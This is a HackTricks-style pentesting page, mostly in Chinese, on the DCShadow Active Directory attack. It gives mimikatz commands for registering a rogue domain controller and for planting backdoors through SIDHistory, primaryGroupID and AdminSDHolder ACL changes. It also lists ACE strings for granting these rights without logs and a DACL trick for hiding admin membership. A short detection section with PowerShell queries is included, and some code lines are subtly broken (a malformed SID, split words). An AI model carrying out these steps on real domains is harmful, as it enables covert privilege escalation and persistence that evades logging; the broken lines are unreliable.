# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

它在 AD 中注册一个 **new Domain Controller**，并使用它对指定对象 **push attributes**（SIDHistory、SPNs...），**不会**留下任何关于这些**修改**的**日志**。你**need DA** 权限并处于**root domain**。\
注意：如果使用错误的数据，会产生相当丑陋的日志。

要执行该攻击，你需要 2 个 mimikatz 实例。其中一个将以 SYSTEM 权限启动 RPC servers（你必须在此指定要执行的更改），另一个实例则用于推送这些值：
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
注意 **`elevate::token`** 在 `mimikatz1` 会话中不起作用，因为它提升的是线程的权限，但我们需要提升的是 **进程的权限**。\
你也可以选择一个 "LDAP" 对象：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

你可以从 DA 或具有以下最小权限的用户推送更改：

- In the **domain object**:
- _DS-Install-Replica_ (在域中添加/删除副本)
- _DS-Replication-Manage-Topology_ (管理复制拓扑)
- _DS-Replication-Synchronize_ (复制同步)
- The **Sites object** (and its children) in the **Configuration container**:
- _CreateChild and DeleteChild_
- The object of the **computer which is registered as a DC**:
- _WriteProperty_ (Not Write)
- The **target object**:
- _WriteProperty_ (Not Write)

你可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限赋予非特权用户（注意这会留下部分日志）。这比拥有 DA 权限要更受限。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这意味着用户名 _**student1**_ 在机器 _**mcorp-student1**_ 上登录时对对象 _**root1user**_ 拥有 DCShadow 权限。

## 使用 DCShadow 创建后门
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### 主组滥用、枚举差异与检测

- `primaryGroupID` 是与组的 `member` 列表独立的属性。DCShadow/DSInternals 可以直接写入它（例如，将 `primaryGroupID=512` 用于 **Domain Admins**），无需 on-box LSASS 强制，但 AD 仍然会**移动**用户：更改 PGID 总是会从先前的主组中剥离该成员资格（对任何目标组行为相同），因此你无法保留旧的主组成员身份。
- 默认工具会阻止将用户从其当前主组中移除（`ADUC`、`Remove-ADGroupMember`），因此更改 PGID 通常需要直接写目录（DCShadow/`Set-ADDBPrimaryGroup`）。
- 成员关系报告不一致：
- **包含** 来自主组的成员： `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **不包含** 来自主组的成员： `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.
- 如果 **主组本身是嵌套组**，递归检查可能会遗漏主组成员（例如用户 PGID 指向 Domain Admins 内的一个嵌套组）；`Get-ADGroupMember -Recursive` 或 LDAP 递归筛选不会返回该用户，除非递归明确解析主组。
- DACL 技巧：攻击者可以在用户上对 `primaryGroupID` **拒绝 ReadProperty**（或者对于非 AdminSDHolder 组在组的 `member` 属性上设置），从而在大多数 PowerShell 查询中隐藏实际成员关系；`net group` 仍将解析该成员关系。受 AdminSDHolder 保护的组会重置此类拒绝。

检测/监控 示例：
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
通过比较 `Get-ADGroupMember` 输出与 `Get-ADGroup -Properties member` 或 ADSI Edit，交叉核对特权组，以捕获由 `primaryGroupID` 或隐藏属性引入的差异。

## Shadowception - 使用 DCShadow 授予 DCShadow 权限（不产生修改权限的日志）

我们需要在末尾追加以下 ACE，将我们的用户 SID 放在末尾：

- 在域对象上：
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 在 attacker computer 对象上：`(A;;WP;;;UserSID)`
- 在目标用户对象上：`(A;;WP;;;UserSID)`
- 在 Configuration 容器的 Sites 对象上：`(A;CI;CCDC;;;UserSID)`

要获取对象的当前 ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

注意，在这种情况下你需要做多次更改，而不是只做一次。因此，在 **mimikatz1 会话**（RPC server）中，对每个要进行的更改使用参数 **`/stack`**。这样，你只需要执行一次 **`/push`** 就能在 rogue server 上应用所有挂起的更改。

[**关于 DCShadow 的更多信息（ired.team）**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## 参考资料

- [TrustedSec - 关于 Primary Group 行为、报告与利用](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [ired.team 上的 DCShadow 详细说明](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
